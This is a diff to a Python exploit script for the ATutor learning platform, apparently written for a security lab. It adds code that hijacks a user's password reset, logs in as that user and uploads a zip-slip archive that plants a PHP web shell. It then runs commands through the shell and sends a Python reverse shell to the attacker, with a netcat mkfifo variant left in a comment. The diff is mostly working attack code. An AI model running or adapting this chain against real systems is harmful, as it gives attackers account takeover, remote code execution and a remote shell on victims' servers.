@@ -91,10 +91,10 @@ def password_reminder(ip, email_prefix, domain):
         "submit": "Submit"
     }
 
-    proxies = {
-        'http': 'http://127.0.0.1:8080'
-    }
-    s.proxies.update(proxies)
+    # proxies = {
+    #     'http': 'http://127.0.0.1:8080'
+    # }
+    # s.proxies.update(proxies)
 
     r = s.post(target, data=data)
 
@@ -164,10 +164,10 @@ def atmail_user_login(atmail_ip, email_prefix, domain):
     }
     s.headers.update(headers)
 
-    proxies = {
-        'http': 'http://127.0.0.1:8080'
-    }
-    s.proxies.update(proxies)
+    # proxies = {
+    #     'http': 'http://127.0.0.1:8080'
+    # }
+    # s.proxies.update(proxies)
 
     target = f"http://{atmail_ip}/index.php/mail/auth/processlogin"
     data = {
@@ -219,6 +219,94 @@ def get_email_code(session, ip):
 
     raise Exception("No valid password reset URL found!")
 
+def reset_password(ip, password_url):
+    s = requests.Session()
+
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
+    }
+    s.headers.update(headers)
+    proxies = {
+        'http': 'http://127.0.0.1:8080'
+    }
+    s.proxies.update(proxies)
+
+    r = s.get(password_url)
+
+    params = {}
+    params_strings = password_url.split('?')[1].split('&')
+    for param in params_strings:
+        x = param.split('=')
+        if len(x) != 2: 
+            raise ("Invalid URL!")
+        params[x[0]] = x[1]
+    
+    target = f'http://{ip}/ATutor/password_reminder.php'
+    PASSWORD = 'Bromine1!'
+    password_hash = hashlib.sha1(PASSWORD.encode()).hexdigest()
+
+    data = {
+        'form_change': 'true',
+        'id': params['id'],
+        'g': params['g'],
+        'h': params['h'], 
+        'password': PASSWORD,
+        'password2': PASSWORD,
+        'form_password_hidden': password_hash,
+        'password_error': '',
+        'submit': 'Submit'
+    }
+
+    r = s.post(target, data=data)
+
+def build_zip():
+    f = BytesIO()
+    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
+
+    z.writestr('../../../../var/www/html/ATutor/mods/poc.php5', data='<?php system($_GET["cmd"]);?>')
+    z.writestr('imsmanifest.xml', data='invalid file!')
+    z.close()
+    zip = open('poc.zip','wb')
+    zip.write(f.getvalue())
+    zip.close()
+
+def upload_zip(ip, session):
+    build_zip()
+
+    target = f"http://{ip}/ATutor/mods/_standard/tests/import_test.php"
+
+    data = {
+        'submit_import': 'Import'
+    }
+
+    with open('poc.zip', 'rb') as file:
+        files = {
+            "file": file
+        }
+
+        r = session.post(target,files=files, data=data)
+
+        if 'XML error' not in r.text:
+            raise "File Upload Failure"
+    print("File Upload Success!")
+    return True
+
+def send_command(ip, session, command):
+    target = f"http://{ip}/ATutor/mods/poc.php5?cmd={command}"
+    r = session.get(target)
+
+    return r.text
+
+def send_reverse_shell(ip, session):
+    LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
+    LPORT = 80
+
+    # payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
+    payload = f"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
+    print(f"Reverse shell payload: {payload}")
+    send_command(ip, session, payload)
+
 def main():
     if len(sys.argv) != 3:
         print ("(+) usage: %s <target> <atmail>" % sys.argv[0])
@@ -258,7 +346,37 @@ def main():
 
     password_url = get_email_code(atmail_user_session, atmail_ip)
 
+    reset_password(ip, password_url)
 
+    print(f"Logging in as user {username}......")
+    session = login(ip, username, hash)
+    
+    # Main page
+    r = session.get(f"http://{ip}/ATutor/users/index.php")
+    text = r.text
+
+    # Get the bounce.php link in the main page response
+    link = re.findall('href="(bounce.php?.*)"', text)
+    if len(link) == 0:
+        raise "No valid course!"
+    print(f"Visiting intermediate link: {link[0]}")
+
+    # Visit the bounce.php link to choose the course
+    r = session.get(f"http://{ip}/ATutor/{link[0]}")
+
+    # Upload zip file with malicious PHP
+    print("Uploading ZIP file with malicios PHP file......")
+    upload_zip(ip, session)
+
+    # Send command to our uploaded reverse shell
+    # Use ifconfig to test that reverse shell is working
+    resp = send_command(ip, session, 'ifconfig')
+    if '127.0.0.1' not in resp:
+        raise "Remote Code Execution Failure!"
+    print("Remote Code Execution working!")
+
+    print("Sending reverse shell... Ensure netcat listening on port 80")
+    resp = send_reverse_shell(ip, session)
 
 if __name__ == '__main__':
     main()
